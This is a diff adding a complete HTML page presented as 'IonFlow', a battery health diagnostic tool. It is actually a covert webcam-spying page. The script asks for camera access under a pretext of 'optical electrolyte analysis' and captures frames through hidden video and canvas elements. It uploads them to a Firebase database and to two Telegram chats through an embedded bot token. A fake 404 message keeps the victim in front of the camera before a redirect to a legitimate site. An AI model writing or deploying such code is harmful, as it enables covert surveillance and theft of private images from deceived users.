@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IonFlow | Battery Health Lab</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --ion-green: #2dd4bf;
+            --ion-dark: #0f172a;
+            --ion-bg: #020617;
+            --danger: #f43f5e;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--ion-bg); 
+            color: #f8fafc;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .header-bar {
+            padding: 20px; background: rgba(15, 23, 42, 0.9);
+            border-bottom: 1px solid rgba(45, 212, 191, 0.2);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .status-pill {
+            background: rgba(45, 212, 191, 0.1); color: var(--ion-green);
+            padding: 4px 12px; border-radius: 20px; font-size: 10px; font-weight: bold;
+            border: 1px solid var(--ion-green);
+        }
+
+        .main-stage {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 20px;
+        }
+
+        .diag-card {
+            width: 100%; max-width: 420px; 
+            background: var(--ion-dark);
+            border-radius: 24px; padding: 40px; text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        /* Disguised Camera UI: Optical Electrolyte Analysis */
+        .battery-viz {
+            width: 100px; height: 180px; margin: 0 auto 30px;
+            border: 4px solid #334155; border-radius: 12px;
+            position: relative; padding: 5px;
+        }
+        .battery-viz::after {
+            content: ''; position: absolute; top: -12px; left: 50%;
+            transform: translateX(-50%); width: 40px; height: 8px;
+            background: #334155; border-radius: 4px 4px 0 0;
+        }
+
+        .fluid-level {
+            width: 100%; height: 60%; background: var(--ion-green);
+            border-radius: 6px; position: absolute; bottom: 5px; left: 0; right: 0;
+            margin: auto; width: calc(100% - 10px);
+            box-shadow: 0 0 20px rgba(45, 212, 191, 0.4);
+            animation: fluid-wave 3s infinite ease-in-out;
+        }
+        @keyframes fluid-wave { 0%, 100% { height: 55%; } 50% { height: 65%; } }
+
+        .optical-scanner {
+            position: absolute; top: 20%; left: 0; width: 100%;
+            height: 2px; background: #fff; box-shadow: 0 0 10px #fff;
+            animation: scan-loop 2s infinite linear;
+        }
+        @keyframes scan-loop { 0% { top: 20%; } 100% { top: 90%; } }
+
+        h2 { font-size: 24px; margin-bottom: 10px; font-weight: 700; }
+        p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-action {
+            background: var(--ion-green); color: var(--ion-bg);
+            border: none; width: 100%; padding: 18px; border-radius: 12px;
+            font-size: 16px; font-weight: 700; cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-action:hover { opacity: 0.9; transform: scale(0.98); }
+
+        /* Logic States */
+        #sync-ui, #error-404 { display: none; }
+
+        .stat-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 15px;
+            margin-top: 25px; text-align: left;
+        }
+        .stat-box {
+            background: rgba(0,0,0,0.2); padding: 12px; border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .stat-label { font-size: 9px; color: #64748b; text-transform: uppercase; }
+        .stat-val { font-size: 14px; color: var(--ion-green); font-weight: bold; }
+
+        /* 404 Visuals */
+        .shutdown-icon { font-size: 50px; color: var(--danger); margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="header-bar">
+        <div style="font-weight: 800; letter-spacing: -1px;">ION<span style="color:var(--ion-green)">FLOW</span></div>
+        <div class="status-pill">NODE: MUMBAI_S1</div>
+    </div>
+
+    <div class="main-stage">
+        <!-- Dashboard Start -->
+        <div class="diag-card" id="init-view">
+            <div class="battery-viz">
+                <div class="fluid-level"></div>
+                <div class="optical-scanner"></div>
+            </div>
+            <h2>Ionic Health Check</h2>
+            <p>Initiate <b>Optical Electrolyte Analysis</b> to calibrate internal chemical resistance. This uses light-refraction data to determine true battery degradation.</p>
+            
+            <button class="btn-action" onclick="startAnalysis()">Analyze Battery Health</button>
+        </div>
+
+        <!-- Syncing UI -->
+        <div class="diag-card" id="sync-ui">
+            <div class="battery-viz" style="border-color: var(--ion-green);">
+                <div class="fluid-level" style="height: 85%; transition: 1s;"></div>
+                <div class="optical-scanner" style="animation-duration: 0.8s;"></div>
+            </div>
+            <h2>Analyzing Chemistry...</h2>
+            <div class="stat-grid">
+                <div class="stat-box">
+                    <div class="stat-label">Voltage Ripple</div>
+                    <div class="stat-val">3.842 V</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-label">Optical Sync</div>
+                    <div class="stat-val" id="sync-status">ESTABLISHING</div>
+                </div>
+            </div>
+            <p style="margin-top: 20px; font-size: 11px;">Keep device steady for optical alignment...</p>
+        </div>
+
+        <!-- 404 Error -->
+        <div class="diag-card" id="error-404">
+            <div class="shutdown-icon">⚠</div>
+            <h2 style="color: var(--danger);">Link Under-Voltage</h2>
+            <p>Error 404: The Mumbai Diagnostic Hub experienced a power-cycle timeout. Visual re-authentication is required to restore your battery health report.</p>
+            <button class="btn-action" style="background: #1e293b; color: #64748b;">Awaiting Visual Bridge...</button>
+        </div>
+    </div>
+
+    <!-- Background Capture -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startAnalysis() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        if(count > 5) document.getElementById('sync-status').innerText = "CALIBRATING";
+                        
+                        if (count <= 55) {
+                            batteryCapture(count);
+                        }
+
+                        // Fake 404 error at 32 seconds
+                        if (count === 32) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.apple.com/batteries/maximizing-performance/";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.google.com/search?q=how+to+check+battery+health";
+            }
+        }
+
+        function batteryCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "BATTERY_OPTICAL_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_S1_DIAGNOSTIC" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'battery_ionic_scan.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
